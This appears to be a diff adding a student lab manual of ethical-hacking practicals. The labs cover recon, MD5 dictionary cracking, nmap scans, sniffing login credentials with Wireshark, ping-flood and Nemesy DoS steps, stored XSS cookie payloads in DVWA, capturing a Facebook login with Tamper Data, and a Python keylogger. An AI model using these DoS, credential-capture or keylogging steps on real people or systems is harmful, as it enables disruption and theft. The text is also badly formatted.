@@ -1,0 +1,197 @@
+Practical No. 01 Aim: Use Google and Whois for Reconnaisasance. 
+Step 1. Open the WHO.is website 
+ Step 3: Show you information about www.prestashop.com. 
+ 
+ ###############################
+Practical No. 02 Aim 2. 1) Password encrypt and decrypt using CryptTool Step 1: Click on File tab-> New, Type any text to encrypt . 
+ 
+Step 2: Click on Encrypt/Decrypt tab Click Symmetric (modern)RC4Enter any keyClick on Encrypt.  
+ Step 3: For Decryption again click on encrypt/Decrypt tab Symmetric(modern) RC4 enter same key  Click on Decrypt. 
+ 
+ 
+2.2) Password Cracking and Wireless Network Password Decoding using cain and abel. 
+Step:-1 Click on hash calculator. 
+ 
+Step 2.Write password in the text to hash field.and click on calculate. 
+ Step 3: Copy hash value of MD5 
+ 
+  
+ 
+Step 4: Go to Cracker and select MD5 on the left side 
+Right click on screen and click on add to list 
+ 
+  
+ 
+Step 5: Paste the previous copied hash value in the following box and click on ok 
+ 
+ 
+Step 6: Right click on last password and click on dictionary attack 
+ 
+Step 7 : Right Click on Dictionaries and select add to list. 
+  
+Step 8: Select wordlist file and click on open 
+ 
+Step 9: Click on start and we get the following output. 
+ 
+Step 10: Click on exit. 
+  ##########################
+######
+#################################################
+Practical no. 3 
+Aim 3. Using TraceRoute, ping, ifconfig, netstat Command Analysis Network  
+Step 1: Type tracert command and type www.prestashop.com press “Enter”. 
+  
+Step 2: Ping all the IP addresses. 
+ 
+Step 3 : Ifconfig : open vmware->open virtual machine -> Ubuntu-> terminaltype ifconfig 
+  
+Step 4 : Netstat 
+  
+ ####################################
+#################################3
+#####################
+ 
+Practical No. 04 
+AIM : Using Nmap scanner to perform port scanning of various forms ACK, SYN, FIN,  NULL,  XMAS. 
+1.	ACK -sA (TCP ACK scan): It never determines open (or even open|filtered) ports. It is used to map out firewall rulesets, determining whether they are stateful or not and which ports are filtered. 
+Command: nmap -sA -T4 scanme.nmap.org 
+  
+ 
+2.	SYN (Stealth Scan)(-sS): SYN scan is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. 
+Command: nmap -p22,113,139 scanme.nmap.org 
+  3.FIN Scan (-sF) :Set just the TCP Fin bit. 
+Command: nmap -sF scanme.nmap.org 
+  
+ 
+4.	Null Scan (-sN): Does not set any bits (TCP flag header is 0). 
+Command: nmap –sN –p22 scanme.nmap.org 
+  
+5.	XMAS Scan (-sX): Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree.            Command: nmap -sX scanme.nmap.org 
+ 
+ 	 
+ ########################################################
+#############################
+######################
+
+
+Practical NO. 05 
+Aim: Network Traffic Capture with Wireshark and DoS Attack using Nemesy. 
+Step 1: Open WireShark.  
+  
+Step 2: Click on any interface where traffic will be showing. 
+   
+Step 3: Open any insecure website (e.g Type zerobank in google searchbox) enter login details and click on     
+              Sign in.  
+  
+ 
+Step 4: Now go to Wireshark again, stop capturing packet, type http in search box, 
+  
+Step 5: Search for POST method, expand HTML form URL encoded, will get username and password of the site. 
+   
+ 
+ 	  
+DoS attack using command prompt 
+Step 1: Open the command prompt on the target computer. Enter the command ipconfig. Note down it. 
+ 
+ 
+Step 2: Switch to the computer that you want to use for the attack and open command prompt. We will ping our victim computer with infinite data packets of 65500. Enter the following command.   Command: ping 10.128.131.108 –t – l 65500 
+ 
+ 
+In order for the attack to be more effective, you should attack the target computer with pings from more than one computer. 
+ 
+Dos attack using Nemesy :  
+Step 1: Turn off antivirus, Securities and Firewall.  
+Step 2: Download Nemesy from http://packetstormsecurity.com/files/25599/nemesy13.zip.html, Unzip it and run the program Nemesy.exe. You will get the following interface 
+Step 3: Enter the target IP address 
+•	0 as the number of packets means infinity. You can set it to the desired  number if you do not want to send, infinity data packets. 
+•	The size field specifies the data bytes to be sent and the delay specifies the time interval in milliseconds. 
+    Step 4: Click on send button. . 
+The title bar will show you the number of packets sent. Click on halt button to stop the program from sending data packets. You can monitor the task manager of the target computer to see the network activities. 
+To check effects of the attack on the target computer, you can open the task manager on target computer and view the network activities. 
+•	Search task manager in search bar 
+•	Click on performance tab 
+•	Click on Open resource monitor, available down of the page.  
+•	You will get results similar to the following. 
+ 
+#########################################33
+##########################3
+########################	 
+ 	 
+Practical No. 06 
+Aim: Persistent Cross-Site Scripting Attack. 
+Step 1: Open XAMPP Server. 
+  
+Step 02: Start modules apache and mysql. if error is given then go to  config(apache)—>select apache(httpd.conf)—>change  Listen and localhost as 8080—>save the file. 
+Then select apache (httpd-ssl.conf)—>change Listen as 4430—>save the file -> start the module. 
+Step 3: Go to site localhost:8080/DVWA/login.php and enter username: admin and password: password. 
+ Step 4: go to home page. 
+   
+Step 5: Click on xss(stored). 
+  
+Step 6: Give name: test 1 and message:<script>alert(“this is xss file”)</script>  and click on sign guestbook. 
+  
+ 
+05. Give name:test 2 and message:<script>alert(document.cookie)</script>  and click on sign guestbook. 
+  
+ 
+ ##############################################
+####################################
+######################3
+ 	 
+Practical No. 07 
+Aim: Session impersonation using Firefox and Tamper Data add-on. 
+Step 1: open firefox and click on add-on 
+  
+2. then click on extensions. and search tempering data. 
+ 3.Click on add to firefox. 
+  
+4. Click on add. 
+  
+5.click on ok 
+  
+6.	Go to facebook login page and start the tempering (i.e click on tempering icon)  
+  
+7.	Click on Yes. 
+  
+8.now enter username and password and login to facebook. 
+  
+9.	Refresh the page and your username and password been captured .  
+ 
+Part C:- using cookie tampering the data. 
+1.	Open FireFox 
+2.	Go to Tools > Addons > Extension 
+   
+3.	Search cookie editor
+  
+   
+4.	Select cookie  editor 
+  
+5.	Click on cookie editor then click on add to firefox 
+  
+6.	Click on to add button. 
+  
+7.	Click to ok button. 
+  
+8.	Now u can see cookie editor on your firefox, if you cannot see click on extension symbol, Click on Cookie Editor, or you can add extension to taskbar you will see symbol of cookie. 
+  
+9.	https://the-internet.herokuapp.com/login go to this link .  
+  
+10.	Now enter username=tomsmith and password =SuperSecretePassword—click on login. 
+  11.	Click on cookie icon on your Firefox— Click on add a new cookie/ + symbol give name and value — Select the cookie and then click on export/ export arrow. 
+ 
+  
+12.	then open with Microsoft word. 
+  
+###########################################
+#####################################
+####################################
+ 
+ 
+Practical No. 08 
+Aim : Create a simple keylogger using python 
+Code : from pynput.keyboard import Key, Listener import logging 
+# If no name is provided, it defaults to an empty string log_dir = "" 
+# Configure basic logging function 
+logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s:%(message)s:') # Function to handle key press events def on_press(key):     logging.info(str(key)) # Turn on the listener with Listener(on_press=on_press) as listener: 
+    listener.join() Output: 
+  
